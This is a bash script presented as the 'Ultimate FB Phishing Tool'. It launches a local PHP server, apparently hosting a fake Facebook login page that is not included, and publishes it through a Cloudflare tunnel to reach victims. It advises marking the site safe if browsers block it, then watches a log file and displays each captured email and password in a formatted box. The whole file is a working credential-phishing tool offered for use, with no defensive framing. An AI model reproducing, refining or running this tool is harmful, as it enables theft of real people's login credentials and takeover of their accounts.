#!/bin/bash

# Color codes for colorful output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
BOLD='\033[1m'     # Bold text
NC='\033[0m'       # No Color

# Function to check if a port is available
is_port_available() {
    local port=$1
    if lsof -i :$port > /dev/null 2>&1; then
        echo -e "${RED}${BOLD}Port $port is already in use!${NC}"
        return 1
    else
        return 0
    fi
}

# Function to validate port number
validate_port() {
    local port=$1
    if [[ ! $port =~ ^[0-9]+$ ]] || [ $port -lt 1 ] || [ $port -gt 65535 ]; then
        echo -e "${RED}${BOLD}Invalid port number! Please enter a number between 1 and 65535.${NC}"
        return 1
    else
        return 0
    fi
}

# Function to display a progress bar
progress_bar() {
    echo -ne "${GREEN}${BOLD}["
    for i in {1..20}; do
        echo -ne "="
        sleep 0.1
    done
    echo -ne "]${NC}\n"
}

# Function to display login credentials in a beautiful box
display_credentials() {
    local email=$1
    local password=$2
    local time=$(date "+%Y-%m-%d %H:%M:%S")

    echo -e "\n${CYAN}${BOLD}+----------------------------------------------+"
    echo -e "| ${GREEN}${BOLD}Login Credentials Captured!${NC}  ${CYAN}|"
    echo -e "+----------------------------------------------+"
    echo -e "| ${BLUE}Time${NC}     : $time        ${CYAN}|"
    echo -e "| ${BLUE}Email${NC}    : $email       ${CYAN}|"
    echo -e "| ${BLUE}Password${NC} : $password    ${CYAN}|"
    echo -e "+----------------------------------------------+${NC}\n"
}

# ASCII Art for Welcome Message
echo -e "${CYAN}${BOLD}
 ____    _    ____ ___ ____  
/ ___|  / \  | __ )_ _|  _ \ 
\___ \ / _ \ |  _ \| || |_) |
 ___) / ___ \| |_) | ||  _ < 
|____/_/   \_\____/___|_| \_\ 
${NC}"
echo -e "${BLUE}${BOLD}Welcome to the Ultimate FB Phishing Tool!${NC}"
echo -e "${PURPLE}${BOLD}Developed by SABIR${NC}\n"

# Display menu options
echo -e "${YELLOW}${BOLD}Select an option to start:${NC}"
echo -e "1) ${GREEN}${BOLD}Start Localhost${NC}"
echo -e "2) ${GREEN}${BOLD}Start Cloudflare Tunnel${NC}"
echo -e "3) ${RED}${BOLD}Exit${NC}"

# Ask for user input
read -p "$(echo -e "${BLUE}${BOLD}Enter your choice (1/2/3): ${NC}")" choice

# Handle user choice
if [ "$choice" == "1" ]; then
    # If Localhost is selected
    echo -e "\n${GREEN}${BOLD}Starting Localhost...${NC}"
    while true; do
        read -p "$(echo -e "${YELLOW}${BOLD}Enter the port number for localhost (e.g., 5000): ${NC}")" port
        if validate_port "$port"; then
            if is_port_available "$port"; then
                break
            else
                echo -e "${YELLOW}${BOLD}Please choose a different port.${NC}"
            fi
        fi
    done

    # Start Localhost
    echo -e "${CYAN}${BOLD}Initializing server...${NC}"
    progress_bar
    php -S 127.0.0.1:$port &

    # Wait for localhost to start up
    sleep 2

    echo -e "\n${BLUE}${BOLD}+----------------------------------------------------------------------------------------------------+${NC}"
    echo -e "${BLUE}${BOLD}| ${GREEN}${BOLD}Your Localhost link: http://127.0.0.1:$port${NC}                                                    |"
    echo -e "${BLUE}${BOLD}+----------------------------------------------------------------------------------------------------+${NC}"
    echo -e "\n${YELLOW}${BOLD}Localhost is running! You can now manually start Cloudflare Tunnel if needed.${NC}"
    echo -e "${PURPLE}${BOLD}Command: ${CYAN}cloudflared tunnel --url http://127.0.0.1:$port${NC}\n"

elif [ "$choice" == "2" ]; then
    # If Cloudflare Tunnel is selected
    echo -e "\n${GREEN}${BOLD}Starting Cloudflare Tunnel...${NC}"
    while true; do
        read -p "$(echo -e "${YELLOW}${BOLD}Enter the port number for Cloudflare Tunnel (e.g., 5000): ${NC}")" port
        if validate_port "$port"; then
            if is_port_available "$port"; then
                break
            else
                echo -e "${YELLOW}${BOLD}Please choose a different port.${NC}"
            fi
        fi
    done

    # Start Localhost server in the background
    echo -e "${CYAN}${BOLD}Starting localhost server on port $port...${NC}"
    php -S 127.0.0.1:$port > /dev/null 2>&1 &
    localhost_pid=$!
    sleep 2  # Wait for server to start

    # Start Cloudflare Tunnel and capture URL
    echo -e "${CYAN}${BOLD}Generating Cloudflare Tunnel URL...${NC}"
    progress_bar

    temp_log=$(mktemp)
    cloudflared tunnel --url http://127.0.0.1:$port > "$temp_log" 2>&1 &
    cloudflared_pid=$!

    # Wait for URL to be generated
    url_generated=false
    for i in {1..30}; do
        if grep -q 'https://.*trycloudflare.com' "$temp_log"; then
            url=$(grep -o 'https://[a-zA-Z0-9.-]*\.trycloudflare.com' "$temp_log" | head -n 1)
            echo -e "\n${GREEN}${BOLD}=== Your Cloudflare Tunnel URL ===${NC}"
            echo -e "${BLUE}${BOLD}$url${NC}\n"
            echo -e "${YELLOW}${BOLD}Note: If your browser blocks the site, mark it as safe or use a custom domain.${NC}"
            url_generated=true
            break
        fi
        sleep 1
    done

    if [ "$url_generated" = false ]; then
        echo -e "${RED}${BOLD}Failed to generate Cloudflare Tunnel URL. Please check your connection and try again.${NC}"
        kill $localhost_pid > /dev/null 2>&1
        kill $cloudflared_pid > /dev/null 2>&1
        exit 1
    fi

    # Monitor login credentials by tailing the log file
    echo -e "${YELLOW}${BOLD}Run (cat log.txt) to see Login Credential or go to log.txt file to see it... ${NC}"
    
    temp_pipe=$(mktemp -u)
    mkfifo "$temp_pipe"

    # Start tailing the log file and redirect to the pipe
    tail -f log.txt > "$temp_pipe" &

    # Read from the pipe and process blocks
    block_started=true
    block=""
    while IFS= read -r line; do
        if [[ "$line" == *"+-----------------------------------------------------------------------------+"* ]]; then
            if [[ "$block_started" == true ]]; then
                block+="$line"$'\n'
                # Extract email and password
                email=$(echo "$block" | grep "Email" | awk -F': ' '{print $2}')
                password=$(echo "$block" | grep "Password" | awk -F': ' '{print $2}')
                if [[ -n "$email" && -n "$password" ]]; then
                    display_credentials "$email" "$password"
                fi
                block_started=false
                block=""
            else
                block_started=true
                block="$line"$'\n'
            fi
        else
            if [[ "$block_started" == true ]]; then
                block+="$line"$'\n'
            fi
        fi
    done < "$temp_pipe"

    # Cleanup
    rm "$temp_pipe"

    # Keep tunnel running
    wait $cloudflared_pid

elif [ "$choice" == "3" ]; then
    # If Exit is selected
    echo -e "\n${RED}${BOLD}Exiting the tool... Goodbye! 👋${NC}\n"
    exit 0

else
    # Invalid choice
    echo -e "\n${RED}${BOLD}Invalid choice! Please select 1, 2, or 3.${NC}"
    exit 1
fi
